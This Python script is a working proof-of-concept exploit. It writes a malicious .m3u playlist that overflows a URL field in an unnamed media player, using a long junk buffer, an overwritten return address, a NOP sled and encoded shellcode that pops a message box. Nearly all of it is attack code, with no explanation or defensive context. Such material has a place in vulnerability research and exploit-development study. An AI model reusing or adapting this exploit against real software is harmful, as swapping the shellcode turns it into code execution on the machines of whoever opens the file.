#Setting the file header, top line and the first part of the url that will not be fuzzed
header="#EXTM3U\r\n"
top_line="#EXTINF:123, Sample artist - Sample title\r\n"
url_part1="http://www."

#Configuring the payload to create the fuzzing files
junk1="A"*35069
eip="\x4D\x6D\x19\x78"
junk2="\x43"*16
nops="\x90"*16

#This is the message box shell
buf =  ""
buf += "\x2b\xc9\x83\xe9\xbf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x19\xba\x39\x92\x83\xee\xfc\xe2\xf4\xc0\x51"
buf += "\xa2\x4b\x6d\x9e\xcd\xa3\xcb\x08\x4e\xa3\xd0\xde\xb2"
buf += "\xe3\x29\x31\x4f\x9e\x92\xcc\x25\x19\x5f\xb2\xb2\xec"
buf += "\x39\x31\x0f\xaa\x56\xa2\x4c\x61\x40\xbb\xe8\x6d\xf8"
buf += "\xda\xb2\xfe\x3d\x9e\xb2\xd7\x25\x31\x6d\xba\x61\xbb"
buf += "\xd3\x19\x53\xa2\xb2\xc8\x39\xbb\xd2\x71\x2d\xf3\xb2"
buf += "\xa6\x92\xbb\xd7\xa3\xe6\x8b\xf9\x6e\xb5\x3e\xf9\xe6"
buf += "\x1e\x7b\xf6\x9f\x18\x7d\xd2\x66\x22\xc6\x1d\xba\x6c"
buf += "\x5b\xb2\xc8\x3d\xbb\xd2\xf4\x92\xb6\x72\x19\x43\xa6"
buf += "\x38\x79\x92\xbe\xb2\x93\xf1\x33\x7d\xb6\x05\xdb\xfa"
buf += "\x20\x11\x93\xed\x1b\xfc\x33\xfb\xfa\x97\xf4\x37\x7e"
buf += "\x4b\x52\xa6\x6d\xe6\x45\xb0\xd7\x1d\x01\x47\x4a\xfb"
buf += "\xc9\xbe\x8e\x3d\xe8\xd1\x1c\xe6\x45\xc6\x1b\x5c\xb2"
buf += "\x51\xfe\x75\x9a\x78\xfa\x2a\x88\x17\xf6\x71\xcf\x4a"
buf += "\xf7\x6b\x8a\xe2\x1a\x45\x9e\x33\x1b\xff\xec\xc6\xc7"
buf += "\x1d\x33\xfb\xc2\xa2\x12\x9b\xdf\xa5\x3d\x25\xb6\x4b"
buf += "\x52\x66\x6d\xe6\x45\x51\xfd\x61\xe2\x19\xfa\x78\xdd"
buf += "\x5c\xd0\x71\xf7\x5c\xe1\x6a\x8b\xe2\x1a\x45\x9e\x33"
buf += "\x1b\xfa\xd2\x57\xca\x39\x9a\x51\xd3\x74\x9a\x70\xa3"
buf += "\xd0\x32\x75\xb6\x1c\x33\xd8\xa3\xcb\xe8\x6a\xc3\x4b"
buf += "\x45\xe9\xa3\xd9\xea\xc6\xc7\x11\xba\x39\x92"



payload=junk1+eip+nops+buf+junk2
url_part2=".com/test.m3u"

#this will create an m3u file that we will upload to the application
try:
	exploit_file=open("m3u_msgbox_file.m3u","w")
	exploit_file.write(header+top_line+url_part1+payload+url_part2)
except Exception as error:
	print ("[!]Could not create file")

#upon successful connection
print("[+]Exploit successful")
print("[+]A message box should pop on your app once file is uploaded")